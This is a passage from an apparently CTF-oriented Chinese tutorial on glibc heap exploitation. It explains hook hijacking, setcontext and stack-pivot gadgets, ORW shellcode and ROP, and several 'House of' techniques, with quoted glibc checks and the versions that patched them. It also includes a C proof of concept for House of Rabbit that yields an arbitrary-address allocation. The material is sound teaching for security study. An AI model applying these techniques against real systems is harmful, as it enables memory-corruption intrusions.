class="line">&#125;))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">声明位置: libc-lockP.h  定义:  </span><br><span class="line"><span class="meta"># <span class="keyword">define</span> __rtld_lock_unlock_recursive(NAME) \</span></span><br><span class="line"><span class="meta">  __libc_maybe_call (__pthread_mutex_unlock, (&amp;(NAME).mutex), 0)</span></span><br><span class="line"> 替换:  </span><br><span class="line">((&#123;</span><br><span class="line">    __typeof(__pthread_mutex_unlock) *_fn = (__pthread_mutex_unlock);</span><br><span class="line">    _fn != ((<span class="type">void</span> *) <span class="number">0</span>) ? (*_fn)(&amp;(_dl_load_lock).mutex) : <span class="number">0</span>;</span><br><span class="line">&#125;))</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/76a1c6eaedfdb13e0435205dceea1ffb.png"
                      alt="在这里插入图片描述"
                ><br>只要改写该函数指针就可以在程序结束时劫持程序执行流程。</p>
<p>glibc-2.34 起 <code>__rtld_lock_lock_recursive</code> 和 <code>__rtld_lock_unlock_recursive</code> 定义发生改变，该 hook 失效。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> __rtld_lock_lock_recursive(NAME) \</span></span><br><span class="line"><span class="meta">  __pthread_mutex_lock (&amp;(NAME).mutex)</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> __rtld_lock_unlock_recursive(NAME) \</span></span><br><span class="line"><span class="meta">  __pthread_mutex_unlock (&amp;(NAME).mutex)</span></span><br></pre></td></tr></table></figure></div>

<h1 id="mmap-获取-libc-基地址"><a href="#mmap-获取-libc-基地址" class="headerlink" title="mmap 获取 libc 基地址"></a>mmap 获取 libc 基地址</h1><p>当用户的请求超过 mmap 分配阈值，并且主分配区使用 sbrk() 分配失败的时候，或是非主分配区在 top chunk 中不能分配到需要的内存时，ptmalloc 会尝试使用 mmap() 直接映射一块内存到进程内存空间。如果获取到分配的堆块地址，就可以获取一个与 libc 基地址有固定偏移的地址。</p>
<h1 id="setcontext-gadget"><a href="#setcontext-gadget" class="headerlink" title="setcontext gadget"></a>setcontext gadget</h1><p>setcontext函数是libc中一个独特的函数，它的功能是传入一个 SigreturnFrame 结构指针，然后根据 SigreturnFrame 的内容设置各种寄存器。<br>因此从 setcontext+53（不同 libc 偏移可能不同）的位置开始有如下 gadget，即根据 rdi 也就是第一个参数指向的 SigreturnFrame 结构设置寄存器。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000047B75 48 8B A7 A0 00 00 00          mov     rsp, [rdi+0A0h]</span><br><span class="line">.text:0000000000047B7C 48 8B 9F 80 00 00 00          mov     rbx, [rdi+80h]</span><br><span class="line">.text:0000000000047B83 48 8B 6F 78                   mov     rbp, [rdi+78h]</span><br><span class="line">.text:0000000000047B87 4C 8B 67 48                   mov     r12, [rdi+48h]</span><br><span class="line">.text:0000000000047B8B 4C 8B 6F 50                   mov     r13, [rdi+50h]</span><br><span class="line">.text:0000000000047B8F 4C 8B 77 58                   mov     r14, [rdi+58h]</span><br><span class="line">.text:0000000000047B93 4C 8B 7F 60                   mov     r15, [rdi+60h]</span><br><span class="line">.text:0000000000047B97 48 8B 8F A8 00 00 00          mov     rcx, [rdi+0A8h]</span><br><span class="line">.text:0000000000047B9E 51                            push    rcx</span><br><span class="line">.text:0000000000047B9F 48 8B 77 70                   mov     rsi, [rdi+70h]</span><br><span class="line">.text:0000000000047BA3 48 8B 97 88 00 00 00          mov     rdx, [rdi+88h]</span><br><span class="line">.text:0000000000047BAA 48 8B 8F 98 00 00 00          mov     rcx, [rdi+98h]</span><br><span class="line">.text:0000000000047BB1 4C 8B 47 28                   mov     r8, [rdi+28h]</span><br><span class="line">.text:0000000000047BB5 4C 8B 4F 30                   mov     r9, [rdi+30h]</span><br><span class="line">.text:0000000000047BB9 48 8B 7F 68                   mov     rdi, [rdi+68h]</span><br><span class="line">.text:0000000000047BB9                               ; &#125; // starts at 47B40</span><br></pre></td></tr></table></figure></div>
<p>因此只需要设置 rdi 为 SignatureFrame 结构体指针，然后跳转到 <code>setcontext + 53</code> 就可以将<strong>除 rax 外</strong>的寄存器设置成对应的值。</p>
<p>例如 free hook 传入的参数是释放的内存的指针，因此可以通过将 free hook 写入 setcontext gadget 然后 free 一个存储 SigreturnFrame 结构的内存来设置寄存器，继而控制程序执行流程来执行 shellcode 或进一步 rop 。</p>
<p>然而，从 libc-2.29 版本起，setcontext 改用 rdx 寄存器来访问 SigreturnFrame 结构，因此无法直接利用 setcontext 的 gadget 将 free 的 SigreturnFrame 结构赋值给寄存器。<br>不过可以先泄露堆地址，然后通过下面两条 gadget 中的一条将释放的 chunk 的内存地址赋值给 rdx 然后跳转到 setcontext 的 gadget 。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov rdx, [rdi+0x8]; mov rax, [rdi]; mov rdi, rdx; jmp rax</span><br><span class="line">mov rdx, [rdi+0x8]; mov [rsp], rax; call qword ptr [rdx+0x20]</span><br></pre></td></tr></table></figure></div>
<p>除此之外，也可以直接调用 setcontext 函数给寄存器赋值，这就是 house of 一骑当千。</p>
<p>除了 setcontext 外还有另一个 gedget 可以同时完成程序执行流劫持和栈迁移：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;svcudp_reply+22&gt;:	mov    rbp,QWORD PTR [rdi+0x48]</span><br><span class="line">&lt;svcudp_reply+26&gt;:	mov    rax,QWORD PTR [rbp+0x18]</span><br><span class="line">&lt;svcudp_reply+30&gt;:	lea    r12,[rbp+0x10]</span><br><span class="line">&lt;svcudp_reply+34&gt;:	mov    DWORD PTR [rbp+0x10],0x0</span><br><span class="line">&lt;svcudp_reply+41&gt;:	mov    rdi,r12</span><br><span class="line">&lt;svcudp_reply+44&gt;:	call   QWORD PTR [rax+0x28]</span><br></pre></td></tr></table></figure></div>
<p>这个 gadget 在不同的 libc 中使用的寄存器不同，具体视情况而定。比如有的 libc 使用的是 rbx 而不是 rbp 导致无法栈迁移实现对程序执行流程的连续劫持。</p>
<p>利用这个gadget，通过<code>rdi</code>控制<code>rbp</code>进而控制<code>rax</code>并执行跳转,只需要在<code>rax + 0x28</code>的位置设置<code>leave; ret</code>即可完成栈迁移.<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/b7b00a8ba06c0bda2d24ff50335ff3fa.png"
                      alt="在这里插入图片描述"
                ></p>
<h1 id="orw-shellcode"><a href="#orw-shellcode" class="headerlink" title="orw shellcode"></a>orw shellcode</h1><p>对于开了沙箱保护的堆题，由于不能 execve ，需要 orw 的手段来获取 flag 。<br>以这个<a class="link"   href="https://gitcode.net/qq_45323960/attachment/-/tree/master/glibc_pwn/pwn_6d42155be48dfe127bf2d8d9ae68f74a" >题目 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>为例，首先在泄露 libc 基地址后通过 house of storm 在 __free_hook 处申请堆块并写入如下数据：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/9f1c3255e77af29d785836b66522068b.png"
                      alt="在这里插入图片描述"
                ></p>
<p>之后释放一个 SigreturnFrame，寄存器设置如下图所示。程序通过 setcontext gadget 设置寄存器后将完成栈迁移可程序执行流劫持后程序将执行，此时会调用 mprotect 函数将 __free_hook 所在内存页添加可执行属性并且会将栈迁移至 &amp;__free_hook+0x8 的位置。执行完 mprotect 函数后程序将跳转至 shellcode1 执行。shellcode 会向 __free_hook 所在内存页起始位置读入能 orw 的 shellcode2 并跳转至 shellcode 执行获取 flag 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/d5e7e35deee043c07f38328a13e2124b.png"
                      alt="在这里插入图片描述"
                ></p>
<h1 id="与-ROP-结合"><a href="#与-ROP-结合" class="headerlink" title="与 ROP 结合"></a>与 ROP 结合</h1><p>除了写 各种 hook 外，堆利用还可以与 ROP 结合。比如开沙箱禁用 execve 调用的堆题除了前面提到的 orw shellcode 方法外也可以用 orw 的 ROP 来获取 flag。</p>
<h2 id="在栈上构造-ROP"><a href="#在栈上构造-ROP" class="headerlink" title="在栈上构造 ROP"></a>在栈上构造 ROP</h2><p>__environ 是一个保存了栈上变量地址的系统变量，位于 libc 中。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/a16b5ee115e914b5a90fa3c496618017.png"
                      alt="在这里插入图片描述"
                ><br>先利用 tcache attack 攻击 <code>__environ</code>  泄露栈地址，然后再利用 tcache 攻击栈上函数的返回地址处，写入 ROP 最后在函数返回控制函数执行流程。</p>
<h2 id="栈迁移至堆"><a href="#栈迁移至堆" class="headerlink" title="栈迁移至堆"></a>栈迁移至堆</h2><p>与 orw shellcode 思路类似，只不过这里只是通过 setcontext rop 将栈迁移至写有 rop 的堆中，利用 rop 来控制程序执行流程。</p>
<h1 id="House-of-Roman"><a href="#House-of-Roman" class="headerlink" title="House of Roman"></a>House of Roman</h1><p>通过覆盖 unsorted bin 的 fd 的低 2 字节对 glibc 上某结构进行 1&#x2F;16 概率的爆破。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/69a156f8e0f8b352ec0befa078045689.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                ></p>
<h1 id="House-Of-Einherjar"><a href="#House-Of-Einherjar" class="headerlink" title="House Of Einherjar"></a>House Of Einherjar</h1><p>House Of Einherjar 主要是利用释放不在 fast bin 大小范围内的 chunk 是会尝试合并前面已释放 chunk 的机制，通过伪造 chunk 头部实现几乎任意地址内存的申请。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/65dd6e231305c31cc6b3f9daa1da18fc.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                >

<ul>
<li><p>构造 fake chunk ，因为 fake chunk 涉及 unlink ，</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">prev_inuse</span>(p)) &#123;</span><br><span class="line">    prevsize = <span class="built_in">prev_size</span>(p);</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = <span class="built_in">chunk_at_offset</span>(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">    <span class="built_in">unlink</span>(av, p, bck, fwd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>因此要绕过 unlink 的一系列检查（当然如果 fake chunk 用一个已经释放的 chunk 也是可以的）：</p>
<ol>
<li><p>为了绕过</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect(FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                 </span><br><span class="line">    <span class="built_in">malloc_printerr</span>(check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);</span><br></pre></td></tr></table></figure></div>

<p>令：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">fake_chunk-&gt;fd = &amp;fake_chunk</span><br><span class="line">fake_chunk-&gt;bk = &amp;fake_chunk</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>为了绕过（glibc-2.26 起）</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect(<span class="built_in">chunksize</span>(P) != <span class="built_in">prev_size</span>(<span class="built_in">next_chunk</span>(P)), <span class="number">0</span>))   </span><br><span class="line">    <span class="built_in">malloc_printerr</span>(<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);  </span><br></pre></td></tr></table></figure></div>

<p>令：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">fake_prev_size1 = fake_size</span><br></pre></td></tr></table></figure></div></li>
</ol>
</li>
<li><p>溢出修改 chunk2 的 <code>prev_size</code> 为 <code>&amp;chunk2 - &amp;fake_chunk</code> 并将 <code>PREV_INUSE</code> 置 0</p>
</li>
<li><p>free chunk2 ，触发 House Of Einherjar 。</p>
</li>
</ul>
<p>自 glibc-2.29 起加入了 prevsize 的检查，house of einherjar 必须确保 fake chunk 的 fake_size 等于 chunk2 的 fake_prev_size2。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">  prevsize = prev_size (p);</span><br><span class="line">  size += prevsize;</span><br><span class="line">  p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">  unlink_chunk (av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="House-Of-Force"><a href="#House-Of-Force" class="headerlink" title="House Of Force"></a>House Of Force</h1><p>篡改 top chunk 的 size 为一个很大值（通常为 0xFFFFFFFF ）可以绕过对用户请求的大小和 top chunk 现有的 size 进行的验证：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取当前的top chunk，并计算其对应的大小</span></span><br><span class="line">victim = av-&gt;top;</span><br><span class="line">size   = <span class="built_in">chunksize</span>(victim);</span><br><span class="line"><span class="comment">// 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE)) </span><br><span class="line">&#123;</span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line">    remainder      = <span class="built_in">chunk_at_offset</span>(victim, nb);</span><br><span class="line">    av-&gt;top        = remainder;</span><br><span class="line">    <span class="built_in">set_head</span>(victim, nb | PREV_INUSE |</span><br><span class="line">            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    <span class="built_in">set_head</span>(remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">check_malloced_chunk</span>(av, victim, nb);</span><br><span class="line">    <span class="type">void</span> *p = <span class="built_in">chunk2mem</span>(victim);</span><br><span class="line">    <span class="built_in">alloc_perturb</span>(p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>如果用户请求的堆大小不受限制就可以使得 top chunk 指向我们期望的任何位置。<br>自 glibc2.29 起新增了对 top chunk size 的合法性检查，house of force 就此失效。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">victim = av-&gt;top;</span><br><span class="line">size = chunksize (victim);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): corrupted top size&quot;</span>);</span><br></pre></td></tr></table></figure></div>
<h1 id="House-of-Rabbit"><a href="#House-of-Rabbit" class="headerlink" title="House of Rabbit"></a>House of Rabbit</h1><p>house of rabbit 有两种攻击方式。</p>
<p>第一种攻击方式是利用 malloc_consolidate 时缺少对 fast bin 中 chunk 的 size 的检查，通过修改 fast bin 中的 chunk 的 size 造成 overlap chunk ,然后触发 malloc_consolidate 使 fastbin 清空，从而分配出重叠的堆块。感觉用处不大，既然能改 size 为什么不先改 size 再释放？</p>
<p>第二种攻击方式是利用 malloc_consolidate 将 fast bin 放入 unsotrted bin 和从 unsorted bin 进 large bin 以及 large bin 切割 chunk 时对 size 检查不严格从而可以不用严格保证 size 正确的情况下将 fake chunk 申请出来，甚至可以任意地址 malloc 。</p>
<p>首先，要想任意地址 malloc 需要让伪造的 chunk 进入 large bin 的最后一个 bin 那么 size 字段至少为 0x80000 。然而 system_mem 初始默认为 0x21000，因此伪造的 chunk 从 unsorted bin 进入 large bin 时会通不过下面的检查：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">    || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">  malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                   chunk2mem (victim), av);</span><br></pre></td></tr></table></figure></div>
<p>因此需要想办法增大 system_mem 。</p>
<p>其中一种办法是通过申请和释放大内存增大 mmap_threshold 然后 sbrk 增大 system_mem 。</p>
<p>当申请一块大内存时如果 ptmalloc 找不到合适的内存会调用 sysmalloc 函数向系统获取内存。<br>就 main_arena 来说，当调用 sysmalloc 时，ptmalloc 获取内存有直接 mmap 和 brk 扩展 heap 区域两种方式。这两种方式的选择由 mmap_threshold 决定。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (av == <span class="literal">NULL</span></span><br><span class="line">    || ((<span class="type">unsigned</span> <span class="type">long</span>) (nb) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (mp_.mmap_threshold)</span><br><span class="line"> &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))</span><br></pre></td></tr></table></figure></div>
<p>只有当所需内存小于 mmap_threshold 时才会调用 brk 扩展内存，system_mem 也才会增加。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (brk != (<span class="type">char</span> *) (MORECORE_FAILURE))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (mp_.sbrk_base == <span class="number">0</span>)</span><br><span class="line">      mp_.sbrk_base = brk;</span><br><span class="line">    av-&gt;system_mem += size;</span><br></pre></td></tr></table></figure></div>
<p>因此需要先想办法增大 mmap_threshold 。</p>
<p>当释放一块 ptmalloc 通过 mmap 得到的内存时会将 mmap_threshold 与 chunk 的 size 取最值，因此可以首先通过申请和释放一块大内存将 mmap_threshold 增大。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (chunk_is_mmapped (p))                       <span class="comment">/* release mmapped memory. */</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* see if the dynamic brk/mmap threshold needs adjusting */</span></span><br><span class="line">    <span class="keyword">if</span> (!mp_.no_dyn_threshold</span><br><span class="line">        &amp;&amp; p-&gt;size &gt; mp_.mmap_threshold</span><br><span class="line">        &amp;&amp; p-&gt;size &lt;= DEFAULT_MMAP_THRESHOLD_MAX)</span><br><span class="line">      &#123;</span><br><span class="line">        mp_.mmap_threshold = chunksize (p);</span><br><span class="line">        mp_.trim_threshold = <span class="number">2</span> * mp_.mmap_threshold;</span><br><span class="line">        LIBC_PROBE (memory_mallopt_free_dyn_thresholds, <span class="number">2</span>,</span><br><span class="line">                    mp_.mmap_threshold, mp_.trim_threshold);</span><br><span class="line">      &#125;</span><br><span class="line">    munmap_chunk (p);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>
<p>之后再次申请一块大内存来增大 system_mem 。</p>
<p>将 fast bin 中的 chunk 的 fd 指向 fake chunk。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/86470c1200bea0487af12792ac83b64e.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                ><br>将 fake chunk 的 size 置1，是为了避免 malloc_consolidate 时与后面的 chunk 合并时 unlink 出错。因为 size 为 1 时查找的下一个地址相邻的 chunk 是自身。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">   size = chunksize(p);</span><br><span class="line">   nextchunk = chunk_at_offset(p, size);</span><br><span class="line">   nextsize = chunksize(nextchunk);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">       prevsize = prev_size(p);</span><br><span class="line">       size += prevsize;</span><br><span class="line">       p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">       unlink(av, p, bck, fwd);	<span class="comment">// 不能执行到这里</span></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">  nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">    size += nextsize;</span><br><span class="line">    unlink(av, nextchunk, bck, fwd);	<span class="comment">// 不能执行到这里</span></span><br><span class="line">  &#125; <span class="keyword">else</span></span><br><span class="line">    clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br></pre></td></tr></table></figure></div>

<p>free 一个不在 fast bin 范围的 chunk 与 top chunk 合并，合并后大小大于 FASTBIN_CONSOLIDATION_THRESHOLD 即 0x10000 触发 malloc_consolidate，此时 fake chunk 进入 unsorted bin，而原本在 fast bin 中的 chunk 和释放的 chunk 都合并到 top chunk 中。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">   <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class="line">     <span class="keyword">if</span> (have_fastchunks(av))</span><br><span class="line">malloc_consolidate(av);</span><br></pre></td></tr></table></figure></div>
<p>为了通过 unsorted bin 到 large bin 时对 size 的检查，同时确保 fake chunk 进入 large bin 的最后一个 bin，需要将 size 的值改为 0x80000 以上。</p>
<p>申请一个大于 0x80000 的内存让 fake chunk 进入 large bin，之后修改 fake chunk 的 size 为一个很大的值（与目标地址的差值再加上一个合适的值，因为第一次 malloc 时会把剩余部分放入 unsorted bin，再次 malloc 会有对 size 的检查）。由于申请内存时从 large bin 的 chunk 切割 chunk 时对 size 缺少检验，因此可以像 house of force 一样任意地址 malloc 。</p>
<p><a class="link"   href="https://gitcode.net/qq_45323960/attachment/-/tree/master/house_of_poc/house_of_rabbit" >poc <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> gbuf[<span class="number">6</span>] = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">void</span> *fast, *small;</span><br><span class="line">	<span class="type">char</span> *victim, target[<span class="number">0x20</span>];</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">free</span>(<span class="built_in">malloc</span>(<span class="number">0x80000</span>));</span><br><span class="line"></span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x80000</span>);</span><br><span class="line"></span><br><span class="line">	fast = <span class="built_in">malloc</span>(<span class="number">0x10</span>); 		</span><br><span class="line">	small = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(fast);</span><br><span class="line"></span><br><span class="line">	gbuf[<span class="number">3</span>] = <span class="number">0x1</span>;	</span><br><span class="line"></span><br><span class="line">	*(<span class="type">unsigned</span> <span class="type">long</span>**)fast = &amp;gbuf[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(small);</span><br><span class="line"></span><br><span class="line">	gbuf[<span class="number">3</span>] = <span class="number">0x80001</span>;</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x80000</span>);</span><br><span class="line"></span><br><span class="line">	gbuf[<span class="number">3</span>] = (<span class="type">void</span>*)&amp;target-(<span class="type">void</span>*)(gbuf+<span class="number">2</span>)<span class="number">-0x20</span>+<span class="number">0x30</span>;	</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">malloc</span>((<span class="type">void</span>*)&amp;target-(<span class="type">void</span>*)(gbuf+<span class="number">2</span>)<span class="number">-0x20</span>);</span><br><span class="line">	victim = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">	</span><br><span class="line">	assert(victim == &amp;target);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,victim);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>glibc-2.26 起，unlink 加入了对 next chunk 的 prev_size 的检查。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \</span></span><br><span class="line"><span class="meta">      malloc_printerr (check_action, <span class="string">&quot;corrupted size vs. prev_size&quot;</span>, P, AV);  \</span></span><br></pre></td></tr></table></figure></div>
<p>而从 large bin 中取出 chunk 时用的是 unlink 。虽然可以通过设置 size 大小使 next chunk 的 prev_size 在可控内存上，但是很有可能会造成之后从 unsorted bin 中取 chunk 时 size 通不过检查，这无疑增加了利用难度。</p>
<p>glibc-2.27 起，malloc_consolidate 加入了对 fast bin 中 chunk 的 size 的检查。至此，house of rabbit 攻击效果与 fast bin attack 相当，<del>不如 tcache attack</del>  。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((&amp;fastbin (av, idx)) != fb)</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc_consolidate(): invalid chunk size&quot;</span>);</span><br></pre></td></tr></table></figure></div>
<h1 id="House-of-Mind"><a href="#House-of-Mind" class="headerlink" title="House of Mind"></a>House of Mind</h1><p>对于非 main_arena 管理的堆是在 mmap 出的一块 heap_info 结构的内存区域中分配内存的。house of mind  正是通过伪造 arena 和 heap info 实现在伪造的 arena 上写一个 chunk 的地址。这里以 fast bin 范围的 chunk 举例。</p>
<p>当释放的 chunk 的 NON_MAIN_ARENA 标志位置 1 则 ptmalloc 认为该 chunk 不属于 main_arena 管理，因此通过先寻找其对应的 heap_info ，然后通过 heap_info 的 ar_ptr 查找 chunk 对应的 arena 。</p>
<p>根据 chunk 寻找 arena 的过程具体实现如下，其中 HEAP_MAX_SIZE 为 0x4000000 。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> heap_for_ptr(ptr) \</span></span><br><span class="line"><span class="meta">  ((heap_info *) ((unsigned long) (ptr) &amp; ~(HEAP_MAX_SIZE - 1)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> arena_for_chunk(ptr) \</span></span><br><span class="line"><span class="meta">  (chunk_non_main_arena (ptr) ? heap_for_ptr (ptr)-&gt;ar_ptr : &amp;main_arena)</span></span><br></pre></td></tr></table></figure></div>
<p>因此可以考虑伪造 heap_info 和 arena 将一个在 fake heap_info 范围内的 chunk 的 NON_MAIN_ARENA 标志位置 1 然后释放该 chunk ，从而在伪造的 arena 上写该 chunk 的地址<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/5183f883b1249e6b01b8072f7e377a22.png"
                      alt="在这里插入图片描述"
                ></p>
<p>其中 system_mem 置为 inf 是为了绕过如下检查：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">   <span class="keyword">if</span> (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">|| __builtin_expect (chunksize (chunk_at_offset (p, size))</span><br><span class="line">		     &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">     &#123;</span><br><span class="line"><span class="comment">/* We might not have a lock at this point and concurrent modifications</span></span><br><span class="line"><span class="comment">   of system_mem might have let to a false positive.  Redo the test</span></span><br><span class="line"><span class="comment">   after getting the lock.  */</span></span><br><span class="line"><span class="keyword">if</span> (have_lock</span><br><span class="line">    || (&#123; assert (locked == <span class="number">0</span>);</span><br><span class="line">	  